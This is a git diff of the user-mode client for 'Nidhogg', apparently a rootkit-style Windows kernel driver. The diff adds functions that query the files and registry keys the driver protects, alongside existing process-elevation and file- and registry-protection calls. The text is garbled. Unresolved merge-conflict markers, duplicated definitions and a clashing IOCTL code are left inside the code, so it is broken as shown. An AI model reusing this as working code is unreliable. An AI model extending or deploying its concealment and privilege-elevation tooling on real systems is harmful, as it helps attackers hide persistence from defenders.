@@ -19,7 +19,9 @@
 #define IOCTL_NIDHOGG_PROTECT_FILE CTL_CODE(0x8000, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_UNPROTECT_FILE CTL_CODE(0x8000, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_CLEAR_FILE_PROTECTION CTL_CODE(0x8000, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_QUERY_FILES CTL_CODE(0x8000, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
+<<<<<<< HEAD
 #define IOCTL_NIDHOGG_PROTECT_REGITEM CTL_CODE(0x8000, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_UNPROTECT_REGITEM CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_CLEAR_REGITEMS CTL_CODE(0x8000, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS)
@@ -32,6 +34,12 @@
 #define IOCTL_NIDHOGG_UNPROTECT_REGITEM CTL_CODE(0x8000, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_CLEAR_REGITEMS CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)
 >>>>>>> 0a9676d (Pre version 0.1 (#6))
+=======
+#define IOCTL_NIDHOGG_PROTECT_REGITEM CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_UNPROTECT_REGITEM CTL_CODE(0x8000, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_CLEAR_REGITEMS CTL_CODE(0x8000, 0x80C, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_QUERY_REGITEMS CTL_CODE(0x8000, 0x80D, METHOD_BUFFERED, FILE_ANY_ACCESS)
+>>>>>>> 9256dee (Added ability to query registry, processes and files)
 // *********************************************************************************************************
 
 // ** General Definitions ***************************************************************************************
@@ -43,6 +51,7 @@
 
 <<<<<<< HEAD
 #define MAX_PIDS 256
+#define MAX_FILES 256
 
 =======
 >>>>>>> 0a9676d (Pre version 0.1 (#6))
@@ -69,10 +78,19 @@ struct ProcessesList {
     ULONG Pids[MAX_PIDS];
 };
 
+<<<<<<< HEAD
 =======
 >>>>>>> 0a9676d (Pre version 0.1 (#6))
+=======
+struct FileItem {
+    int FileIndex;
+    WCHAR FilePath[MAX_PATH];
+};
+
+>>>>>>> 9256dee (Added ability to query registry, processes and files)
 struct RegItem {
-    int Type;
+    int RegItemsIndex;
+    ULONG Type;
     WCHAR KeyPath[REG_KEY_LEN];
     WCHAR ValueName[REG_VALUE_LEN];
 };
@@ -258,7 +276,7 @@ int NidhoggProcessElevate(std::vector<DWORD> pids) {
     return NIDHOGG_SUCCESS;
 }
 
-std::vector<DWORD> NidhoggProcessQuery() {
+std::vector<DWORD> NidhoggQueryProcesses() {
     ProcessesList result{};
     std::vector<DWORD> pids;
     DWORD returned;
@@ -339,6 +357,56 @@ int NidhoggFileClearAllProtection() {
 
     CloseHandle(hFile);
     return NIDHOGG_SUCCESS;
+}
+
+std::vector<std::wstring> NidhoggQueryFiles() {
+    FileItem result{};
+    std::vector<std::wstring> files;
+    int amountOfFiles = 0;
+    DWORD returned;
+
+    HANDLE hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
+
+    if (hFile == INVALID_HANDLE_VALUE) {
+        files.push_back(std::to_wstring(NIDHOGG_ERROR_CONNECT_DRIVER));
+        return files;
+    }
+    result.FileIndex = 0;
+
+    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_QUERY_FILES,
+        nullptr, 0,
+        &result, sizeof(result), &returned, nullptr)) {
+        files.push_back(std::to_wstring(NIDHOGG_ERROR_DEVICECONTROL_DRIVER));
+        CloseHandle(hFile);
+        return files;
+    }
+
+    amountOfFiles = result.FileIndex;
+
+    if (amountOfFiles == 0)
+        return files;
+
+    files.push_back(std::wstring(result.FilePath));
+    result.FilePath[0] = L'\0';
+
+    for (int i = 1; i < amountOfFiles; i++) {
+        result.FileIndex = i;
+
+        if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_QUERY_FILES,
+            nullptr, 0,
+            &result, sizeof(result), &returned, nullptr)) {
+            files.clear();
+            files.push_back(std::to_wstring(NIDHOGG_ERROR_DEVICECONTROL_DRIVER));
+            CloseHandle(hFile);
+            return files;
+        }
+        
+        files.push_back(std::wstring(result.FilePath));
+        result.FilePath[0] = L'\0';
+    }
+    
+    CloseHandle(hFile);
+    return files;
 }
 
 int NidhoggRegistryProtectKey(wchar_t* key) {
@@ -480,4 +548,114 @@ int NidhoggRegistryClearAllProtection() {
 
     CloseHandle(hFile);
     return NIDHOGG_SUCCESS;
+}
+
+std::vector<std::wstring> NidhoggRegistryQueryKey() {
+    RegItem result{};
+    std::vector<std::wstring> keys;
+    int amountOfKeys = 0;
+    DWORD returned;
+
+    HANDLE hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
+
+    if (hFile == INVALID_HANDLE_VALUE) {
+        keys.push_back(std::to_wstring(NIDHOGG_ERROR_CONNECT_DRIVER));
+        return keys;
+    }
+    result.RegItemsIndex = 0;
+    result.Type = REG_TYPE_KEY;
+
+    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_QUERY_REGITEMS,
+        nullptr, 0,
+        &result, sizeof(result), &returned, nullptr)) {
+        keys.push_back(std::to_wstring(NIDHOGG_ERROR_DEVICECONTROL_DRIVER));
+        CloseHandle(hFile);
+        return keys;
+    }
+
+    amountOfKeys = result.RegItemsIndex;
+
+    if (amountOfKeys == 0)
+        return keys;
+
+    keys.push_back(std::wstring(result.KeyPath));
+    result.KeyPath[0] = L'\0';
+
+    for (int i = 1; i < amountOfKeys; i++) {
+        result.RegItemsIndex = i;
+
+        if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_QUERY_REGITEMS,
+            nullptr, 0,
+            &result, sizeof(result), &returned, nullptr)) {
+            keys.clear();
+            keys.push_back(std::to_wstring(NIDHOGG_ERROR_DEVICECONTROL_DRIVER));
+            CloseHandle(hFile);
+            return keys;
+        }
+
+        keys.push_back(std::wstring(result.KeyPath));
+        result.KeyPath[0] = L'\0';
+    }
+
+    CloseHandle(hFile);
+    return keys;
+}
+
+std::tuple<std::vector<std::wstring>, std::vector<std::wstring>> NidhoggRegistryQueryValue() {
+    RegItem result{};
+    std::vector<std::wstring> values;
+    std::vector<std::wstring> valuesKeys;
+    int amountOfValues = 0;
+    DWORD returned;
+
+    HANDLE hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
+
+    if (hFile == INVALID_HANDLE_VALUE) {
+        values.push_back(std::to_wstring(NIDHOGG_ERROR_CONNECT_DRIVER));
+        return { values, valuesKeys };
+    }
+
+    result.RegItemsIndex = 0;
+    result.Type = REG_TYPE_VALUE;
+
+    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_QUERY_REGITEMS,
+        &result, sizeof(result),
+        &result, sizeof(result), &returned, nullptr)) {
+        values.clear();
+        values.push_back(std::to_wstring(NIDHOGG_ERROR_DEVICECONTROL_DRIVER));
+        CloseHandle(hFile);
+        return { values, valuesKeys};
+    }
+
+    amountOfValues = result.RegItemsIndex;
+
+    if (amountOfValues == 0)
+        return { values, valuesKeys };
+
+    valuesKeys.push_back(std::wstring(result.KeyPath));
+    values.push_back(std::wstring(result.ValueName));
+    result.KeyPath[0] = L'\0';
+    result.ValueName[0] = L'\0';
+
+    for (int i = 1; i < amountOfValues; i++) {
+        result.RegItemsIndex = i;
+
+        if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_QUERY_REGITEMS,
+            nullptr, 0,
+            &result, sizeof(result), &returned, nullptr)) {
+            values.clear();
+            valuesKeys.clear();
+            values.push_back(std::to_wstring(NIDHOGG_ERROR_DEVICECONTROL_DRIVER));
+            CloseHandle(hFile);
+            return { values, valuesKeys };
+        }
+
+        valuesKeys.push_back(std::wstring(result.KeyPath));
+        values.push_back(std::wstring(result.ValueName));
+        result.KeyPath[0] = L'\0';
+        result.ValueName[0] = L'\0';
+    }
+
+    CloseHandle(hFile);
+    return { values, valuesKeys };
 }
